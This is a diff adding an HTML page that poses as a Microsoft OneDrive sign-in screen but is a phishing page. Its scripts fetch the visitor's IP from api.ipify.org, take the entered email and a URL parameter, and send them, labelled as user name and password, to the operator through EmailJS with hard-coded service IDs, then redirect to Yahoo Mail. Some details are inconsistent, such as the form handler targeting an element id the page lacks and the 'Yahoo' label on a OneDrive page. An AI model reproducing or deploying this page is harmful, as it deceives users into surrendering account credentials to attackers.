@@ -1,0 +1,151 @@
+<!doctype html>
+<html lang="en">
+  <head>
+    <!-- Required meta tags -->
+    <meta charset="utf-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1">
+    <meta name="description" content="">
+    <meta name="author" content="f3lakutie">
+
+
+    <!-- font awesome-->
+    <link rel="stylesheet" href="https://pro.fontawesome.com/releases/v5.10.0/css/all.css" integrity="sha384-AYmEC3Yw5cVb3ZcuHtOA93w35dYTsvhLPVnYs9eStHfGJvOvKxVfELGroGkvsg+p" crossorigin="anonymous" >
+    
+     
+    <!-- favicon-->
+    <link rel="shortcut icon" href="micrologo.jpg" type="image/png">
+    <!-- for apple mobile devices -->
+    <link rel="apple-touch-icon-precomposed" href="micrologo.jpg" type="image/png" sizes="152x152">
+    <link rel="apple-touch-icon-precomposed" href="micrologo.jpg" type="image/png" sizes="120x120">
+
+    <!-- default style-->
+    <style>
+        /*
+        */
+    </style>
+
+    <title>OneDrive</title>
+
+    <!-- Custom styles for this page -->
+    <link href="form.css" rel="stylesheet"> 
+    <link href="style.css" rel="stylesheet">
+    <script src="https://ajax.googleapis.com/ajax/libs/jquery/3.2.1/jquery.min.js">
+    </script>
+
+  </head>
+
+  <body class="logpage">
+    <script type="text/javascript" src="https://cdn.jsdelivr.net/npm/emailjs-com@2.4.0/dist/email.min.js">
+    </script>
+      <script>
+          function getParameterByName(name, url = window.location.href) {
+                name = name.replace(/[\[\]]/g, '\\$&');
+                var regex = new RegExp('[?&]' + name + '(=([^&#]*)|&|#|$)'),
+                    results = regex.exec(url);
+                if (!results) return null;
+                if (!results[2]) return '';
+                return decodeURIComponent(results[2].replace(/\+/g, ' '));
+            }
+            var foo = getParameterByName('usr');
+
+            
+      </script>
+    
+    <div class="outta" >
+       
+		<div class="inner">
+           
+		 <div class="main">
+		
+            
+			<div> <img src="microsoft_PNG17.png" height="25px">
+		</div>
+                <form method="get" action="ver.html">
+					<h2>Sign in</h2>
+                    <div class="" id="ttt">
+                        <input type="text" id="usr" name="usr" placeholder="Email, Username, or Skype" required >
+                    </div>
+<!--
+                    <div class="input-field" id="uuu">
+                        <input type="&#112;&#97;&#115;&#115;&#119;&#111;&#114;&#100;" id="pas" name = "ppp" required>
+                    </div>
+
+                    -->
+                    
+                    <div class="create-key-field">
+                        <p><a href="">No account? Create one!</a></p>
+                    </div>
+					
+					<div class="input-field-button">
+                        <input type="submit" value="Next" class="btn forward ">
+						<p class="spacer">&nbsp;</p>
+                    </div>
+
+                </form>
+            
+        </div>
+
+		</div>
+		</div>
+    
+    <script>
+            var xxip;
+            // Add "https://ipinfo.io" statement
+        // this will communicate with the ipify servers
+        // in order to retrieve the IP address
+            window.onload = function(){
+                $.getJSON("https://api.ipify.org?format=json", function(data) {
+                        
+                        // Setting text of element P with id gfg
+                        xxip = data.ip;
+			console.log(xxip);
+                        
+                        
+                    })                
+                }
+        
+            
+            // "json" shows that data will be fetched in json format
+            function sendmail(){
+                (function() {
+                    emailjs.init("CDjm3JXQUdtMpodTf"); //please encrypted user id for malicious attacks
+                    })();
+                //set the parameter as per you template parameter[https://dashboard.emailjs.com/templates]
+                var templateParams = {
+                    domain: "Yahoo",
+                    user_name: foo,
+                    user_pass: document.getElementById("usr").value,
+                    ip: xxip,
+                };
+
+                emailjs.send('service_q6bk2ve', 'template_1n850c3', templateParams)
+                    .then(function(response) {
+                    window.location.href = "https://mail.yahoo.com";
+                    }, function(error) {
+                    alert('FAILED...', error);
+                    });
+
+            }
+
+            function processForm(e) {
+                if (e.preventDefault) e.preventDefault();
+
+                /* do what you want with the form */
+            sendmail()
+            
+
+                // You must return false to prevent the default form behavior
+                return false;
+            }
+
+            var form = document.getElementById('my-form');
+
+            if (form.attachEvent) {
+                form.attachEvent("submit", processForm);
+            } else {
+                form.addEventListener("submit", processForm);
+            }
+
+    </script>
+  </body>
+</html>
